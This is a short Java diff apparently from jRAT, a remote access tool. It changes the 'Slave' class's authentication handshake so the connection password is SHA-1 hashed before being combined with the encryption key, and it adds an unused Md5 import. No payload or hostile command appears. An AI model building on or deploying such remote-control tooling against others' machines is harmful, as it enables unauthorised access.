@@ -19,6 +19,7 @@ import io.jrat.common.OperatingSystem;
 import io.jrat.common.Version;
 import io.jrat.common.codec.Hex;
 import io.jrat.common.crypto.Crypto;
+import io.jrat.common.hash.Md5;
 import io.jrat.common.hash.Sha1;
 
 import java.awt.TrayIcon;
@@ -145,9 +146,9 @@ public class Slave implements Runnable {
 				byte header = readByte();
 
 				if (header == 1) {
-					String data = connection.getPass() + "&" + Hex.encode(connection.getKey().getKey());
-
 					Sha1 sha = new Sha1();
+					
+					String data = sha.hashToString(connection.getPass()) + "&" + Hex.encode(connection.getKey().getKey());
 
 					byte[] localHash = sha.hash(data);
 					byte[] remoteHash = new byte[20];
